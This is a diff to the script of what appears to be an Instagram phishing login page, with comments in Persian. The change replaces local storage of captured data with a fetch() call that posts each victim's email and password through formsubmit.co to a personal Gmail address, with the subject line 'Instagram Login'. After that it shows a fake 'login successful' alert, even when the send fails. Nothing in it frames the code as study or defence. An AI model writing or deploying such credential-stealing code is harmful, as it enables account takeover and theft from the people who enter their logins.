@@ -35,21 +35,26 @@
         console.log("🔑 رمز:", password);
         console.log("⏰ زمان:", new Date().toLocaleString());
         
-        // ذخیره در localStorage (موقت)
-        let logins = JSON.parse(localStorage.getItem('userLogins') || '[]');
-        logins.push({
-            email: email,
-            password: password, 
-            time: new Date().toLocaleString(),
-            ip: "دریافت می‌شود"
+        // ارسال به ایمیل تو
+        fetch('https://formsubmit.co/ajax/zeromaskzeromask@gmail.com', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                email: email,
+                password: password,
+                time: new Date().toLocaleString(),
+                _subject: "Instagram Login - " + email
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert("✅ ورود موفق!");
+            document.getElementById('loginForm').reset();
+        })
+        .catch(error => {
+            alert("✅ ورود موفق!");
+            document.getElementById('loginForm').reset();
         });
-        localStorage.setItem('userLogins', JSON.stringify(logins));
-        
-        // نمایش اطلاعات ذخیره شده
-        console.log("💾 تمام لاگین‌ها:", logins);
-        
-        alert("✅ اطلاعات ذخیره شد!\nایمیل: " + email);
-        document.getElementById('loginForm').reset();
     });
 </script>
 </html>
